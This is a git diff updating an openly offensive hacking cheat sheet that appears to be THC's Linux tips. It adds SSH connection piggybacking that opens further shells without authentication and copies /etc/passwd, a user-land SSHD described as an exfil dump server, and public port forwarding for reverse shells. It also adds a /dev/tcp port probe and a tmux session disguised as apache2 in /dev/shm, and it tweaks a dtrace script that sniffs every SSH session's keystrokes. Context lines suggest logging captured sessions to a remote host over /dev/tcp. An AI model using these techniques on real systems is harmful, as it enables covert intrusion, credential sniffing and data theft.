@@ -21,6 +21,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Execute in parrallel with separate logfiles](#parallel)
 1. [SSH](#ssh)
    1. [Almost invisible SSH](#ssh-invisible)
+   1. [Multiple shells via 1 SSH/TCP connection](#ssh-master)
    1. [SSH tunnel](#ssh-tunnel)
    1. [SSH socks5 tunnel](#ssh-socks-tunnel)
    1. [SSH to NATed host](#ssh-j)
@@ -100,7 +101,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 1. [Miscellaneous](#misc)
    1. [Tools of the trade](#tools)
    1. [Cool Linux commands](#cool-linux-commands)
-   1. [tmux](#tmux)
+   1. [tmux Cheat Sheet](#tmux)
    1. [Useful commands](#useful-commands)
 1. [Other Sites](#others)
     
@@ -323,7 +324,7 @@ thcssh()
 {
     local ttyp
     echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
-    echo -e "PS1='"'{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
+    echo -e "PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
     ttyp=$(stty -g)
     stty raw -echo opost
     [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
@@ -334,8 +335,26 @@ thcssh()
 }
 ```
 
+<a id="ssh-master"></a>
+**2.ii Multiple shells via 1 SSH/TCP connection**
+
+Have one TCP connection to the target and allow multiple users to piggyback on the same TCP connection to open further shell sessions.
+
+Create a Master Connection:
+```sh
+ssh -M -S .sshmux user@server.org
+```
+
+Create further shell-sessions using the same (single) Master-TCP connection from above (no password/auth needed):
+```sh
+ssh -S .sshmux NONE
+#ssh -S .sshmux NONE ls -al
+#scp -o "ControlPath=.sshmux" NONE:/etc/passwd .
+```
+Can be combined with [thcssh](#ssh-invisible) to hide from utmp.
+
 <a id="ssh-tunnel"></a>
-**2.ii SSH tunnel**
+**2.iii SSH tunnel**
 
 We use this all the time to circumvent local firewalls and IP filtering:
 ```sh
@@ -352,7 +371,7 @@ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
 Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-socks-tunnel"></a>
-**2.iii SSH socks4/5 tunnel**
+**2.iv SSH socks4/5 tunnel**
 
 OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.
 
@@ -370,7 +389,7 @@ ssh -g -R 1080 user@server.org
 The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-j"></a>
-**2.iv SSH to a host behind NAT**
+**2.v SSH to a host behind NAT**
 
 [ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).
 
@@ -400,7 +419,7 @@ The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind
 
 
 <a id="ssh-pj"></a>
-**2.v SSH pivoting to multiple servers**
+**2.vi SSH pivoting to multiple servers**
 
 SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let's assume the scenario:  
 
@@ -427,9 +446,9 @@ kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
 > We use this as well to hide our IP address when logging into servers. 
 
 <a id="sshd-user"></a>
-**2.vi SSHD as user land**
+**2.vii SSHD as user land**
 
-It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing):
+It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing) or as a quick exfil-dump-server that runs as non-root:
 ```sh
 # On the server, as non-root user 'joe':
 mkdir -p ~/.ssh 2>/dev/null
@@ -502,6 +521,8 @@ socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
 
 Using [segfault.net](https://thc.org/segfault.net) (free):
 ```sh
+# Request a random public TCP port:
+curl sf/port
 echo "Your public IP:PORT is $(cat /config/self/reverse_ip):$(cat /config/self/reverse_port)"
 nc -vnlp $(cat /config/self/reverse_port)
 ```
@@ -510,6 +531,12 @@ Using [bore.pub](https://github.com/ekzhang/bore) (free):
 ```sh
 # Forward a random public TCP port to localhost:31337
 bore local 31337 --to bore.pub
+```
+
+using [serveo.net](https://serveo.net) (free):
+```sh
+# Forward a random public TCP port to localhost:31337
+ssh -R 0:localhost:31337 serveo.net
 ```
 
 See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from the target to your workstation or [ngrok](https://ngrok.com/) (paid subscription) to forward a raw public TCP port.
@@ -706,6 +733,11 @@ Fast (-F) vulnerability scan
 nmap -sCV -F -Pn --min-rate 10000 scanme.nmap.org
 # Vulns
 nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
+```
+
+Using bash:
+```shell
+timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
 ```
 
 ---
@@ -1386,7 +1418,7 @@ export TERM=xterm-256color
 reset
 stty rows 24 columns 120
 # Pimp up your prompt
-PS1='{THC} USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
 ```
 
 <a id="reverse-shell-socat"></a>
@@ -1716,7 +1748,7 @@ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
 <a id="dtrace"></a>
-**9.ii Sniff all SHELL sessions with dtrace**
+**9.ii Sniff all SHELL sessions with dtrace - FreeBSD**
 
 Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace *all* sshd processes.
 
@@ -1725,7 +1757,7 @@ Copy this "D Script" to the target system to a file named `d`:
 #pragma D option quiet
 inline string NAME = "sshd";
 syscall::write:entry
-/(arg0 >= 7) && (arg2 <= 16) && (execname == NAME)/
+/(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
 { printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
 ```
 
@@ -1736,7 +1768,7 @@ Start a dtrace and log to /tmp/.log:
 ```
 
 <a id="bpf"></a>
-**9.iii Sniff all SHELL sessions with eBPF**
+**9.iii Sniff all SHELL sessions with eBPF - Linux**
 
 eBPF allows us to *safely* hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  
 
@@ -2026,14 +2058,18 @@ Mindmaps & Knowledge
 1. https://github.com/ibraheemdev/modern-unix
 
 <a id="tmux"></a>
-**12.iii. tmux**
+**12.iii. Tmux Cheat Sheet**
+
 
 | | Tmux Cheat Sheet |
 | --- | --- |
-| Save Scrollback | ```Ctrl+b``` + ```:```, then type ```capture-pane -S -``` followed by ```Ctrl+b``` + ```:``` and type ```save-buffer filename.txt```. |
-| Attach | Start a new tmux, then type ```Ctrl+b``` + ```s``` and use ```LEFT```, ```RIGHT``` to expand and select any session. |
-| Logging | ```Ctrl+b``` + ```Shift + P``` to start and stop. |
-| Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |
+| SaveScrollback | `Ctrl+b` + `:`, then type `capture-pane -S -` followed by `Ctrl+b` + `:` and type `save-buffer filename.txt`. |
+| SpyScrollback | `tmux capture-pane -e -pS- -t 6.0` to capture pane 6, window 0 of a running tmux. Remove `-e` to save without colour. |
+| Clear | `tmux send-keys -R C-l \; clear-history -t6.0` to clear screen and delete scrollback history. |
+| Logging | `Ctrl+b` + `Shift + P` to start and stop. |
+| HiddenTmux | `cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache`<BR>To attach to your session do <BR>`cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache attach` |
+| Attach | Start a new tmux, then type `Ctrl+b` + `s` and use `LEFT`, `RIGHT` to preview and select any session. |
+| Menu | `Ctrl+b` + `>`. Then use `Ctrl+b` + `UP`, `DOWN`, `LEFT` or `RIGHT` to move between the panes. |
 
 <a id="useful-commands"></a>
 **12.iv. Useful commands**
